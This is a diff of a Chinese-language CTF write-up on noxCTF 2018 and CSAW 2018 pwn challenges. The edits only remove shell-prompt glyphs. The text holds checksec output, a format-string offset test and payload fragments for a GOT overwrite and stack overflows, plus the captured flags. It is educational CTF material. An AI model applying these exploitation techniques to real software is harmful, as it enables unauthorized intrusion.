@@ -26,9 +26,9 @@ tags: WriteUp PWN noxCTF CSAWCTF
 惯例先走一遍file+checksec检查
 
 ```bash
-➜  believeMe file believeMe 
+  believeMe file believeMe 
 believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped
-➜  believeMe checksec believeMe 
+  believeMe checksec believeMe 
 [*] '/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -40,12 +40,12 @@ believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically
 再简单的运行下程序看看程序是什么样的结构
 
 ```bash
-➜  believeMe ./believeMe 
+  believeMe ./believeMe 
 Someone told me that pwning makes noxāle...
 But......... how ???? 
 aaaa
 aaaa%  
-➜  believeMe
+  believeMe
 ```
 
 然后ida简单分析下，我们可以很直接的看到在main函数里有一个格式化字符串漏洞
@@ -61,12 +61,12 @@ aaaa%
 这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9
 
 ```bash
-➜  believeMe ./believeMe 
+  believeMe ./believeMe 
 Someone told me that pwning makes noxāle...
 But......... how ???? 
 aaaa%9$x
 aaaa61616161%                                                         
-➜  believeMe 
+  believeMe 
 ```
 
 然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40
@@ -179,9 +179,9 @@ noxCTF{%N3ver_%7rust_%4h3_%F0rmat}
 惯例检查一遍文件
 
 ```bash
-➜  TheNameCalculator file TheNameCalculator 
+  TheNameCalculator file TheNameCalculator 
 TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f717904e2313e4d6c3bc92730d2e475861123dd, not stripped
-➜  TheNameCalculator checksec TheNameCalculator 
+  TheNameCalculator checksec TheNameCalculator 
 [*] '/home/Ep3ius/pwn/process/noxCTF2018/TheNameCalculator/TheNameCalculator'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -193,13 +193,13 @@ TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dyn
 简单过一遍程序，只有一个输入
 
 ```bash
-➜  TheNameCalculator ./TheNameCalculator 
+  TheNameCalculator ./TheNameCalculator 
 What is your name?
 Ep3ius 
 I've heard better
 ```
 
-开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造payload = 'a'*(0x2c-0x10)+p32(0x6A4B825)让v4在if判断时的值为0x6A4B825
+开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造payload = 'a'* (0x2c-0x10)+p32(0x6A4B825)让v4在if判断时的值为0x6A4B825
 
 ```c
 puts("What is your name?");
@@ -289,9 +289,9 @@ noxCTF{M1nd_7he_Input}
 简单的bof类型题目，先检查文件
 
 ```bash
-➜  bigboy file boi 
+  bigboy file boi 
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
-➜  bigboy checksec boi 
+  bigboy checksec boi 
 [*] '/home/Ep3ius/pwn/process/CSAW2018/bigboy/boi'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -327,7 +327,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-本以为构造payload = 'a'*(0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4
+本以为构造payload = 'a'* (0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4
 
 ```bash
 [-------------------------------------code-------------------------------------]
@@ -401,9 +401,9 @@ flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
 #### PWN—get it
 
 ```bash
-➜  get_it file get_it 
+  get_it file get_it 
 get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
-➜  get_it checksec get_it 
+  get_it checksec get_it 
 [*] '/home/Ep3ius/pwn/process/CSAW2018/get_it/get_it'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -443,9 +443,9 @@ flag{y0u_deF_get_itls}
 #### PWN—shell->code
 
 ```bash
-➜  shellpointcode file shellpointcode 
+  shellpointcode file shellpointcode 
 shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
-➜  shellpointcode checksec shellpointcode 
+  shellpointcode checksec shellpointcode 
 [*] '/home/Ep3ius/pwn/process/CSAW2018/shellpointcode/shellpointcode'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -458,7 +458,7 @@ shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamica
 很明显的让你写shellcode的题目，简单的审计和运行过一遍程序后发现他是一个有两个节点链表结构，并且每个节点输入最多为15byte，并且在node.next泄露出了栈上的地址，对于完整shellcode来说15字节一般是不够的
 
 ```bash
-➜  shellpointcode ./shellpointcode 
+  shellpointcode ./shellpointcode 
 Linked lists are great! 
 They let you chain pieces of data together.
 
